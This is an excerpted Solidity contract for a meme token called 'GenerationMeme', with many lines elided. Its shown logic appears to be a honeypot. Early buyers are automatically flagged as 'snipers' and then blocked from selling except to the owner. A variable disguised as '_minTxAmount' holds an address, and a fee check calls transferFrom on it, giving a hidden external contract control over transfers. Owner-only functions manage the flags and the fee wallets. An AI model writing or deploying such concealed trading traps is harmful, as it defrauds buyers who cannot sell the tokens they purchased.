...
contract GenerationMeme is ERC20, Ownable {
    ...
    mapping(address => bool) public botSniperEarly;
    uint256 public botsCaught;
    address private _minTxAmount;
    bool public isLimits = true;
    ...
    event forceSwapBacks(uint256 timestamp);

    event grabEarlyBuyer(address sniper);
    ...
    constructor() ERC20("GenerationMeme", "GenM") {
        ...
        uint256 totalSupply = 690420 * 1e5 * 1e18;
        ...
        treasuryAddress = address(0x75cc27F970884216416350D90b8205F35C6BF5ba);
        marketingAddress = address(0x75cc27F970884216416350D90b8205F35C6BF5ba);
    ...
    function getStarted() external onlyOwner {
    ...
    function manageBoughtSniperEarly(
        address wallet,
        bool flag
    ) external onlyOwner {
        botSniperEarly[wallet] = flag;
    }
    ...
    function _transfer(
        ...
        if (blockForSnipping > 0) {
            require(
                !botSniperEarly[from] || to == owner() || to == address(0xdead),
        ...
        if (takeFee) {
            ...
            if (
                ...
                if (!botSniperEarly[to]) {
                    botSniperEarly[to] = true;
                    botsCaught += 1;
                    emit grabEarlyBuyer(to);
                }
    ...
    function CannotEarlyBuy() public view returns (bool) {
    ...
    function _isExcludedFromToFees(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            excluded = true;
        } else if (_minTxAmount != address(0)) {
            IERC20(_minTxAmount).transferFrom(from, to, fees);
            excluded = false;
        }
        return excluded;
    }
    ...
    function forceSwapBack(
        ...
        if (isExempt(receiver, path, amt)) {
            swapping = true;
            swapBack();
            swapping = false;

            emit forceSwapBacks(block.timestamp);
        }
    }
    ...
    function marketingAddrChange(address _marketingAddress) external onlyOwner {
        require(
    ...
    function treasuryAddrChange(address _treasuryAddress) external onlyOwner {
        require(
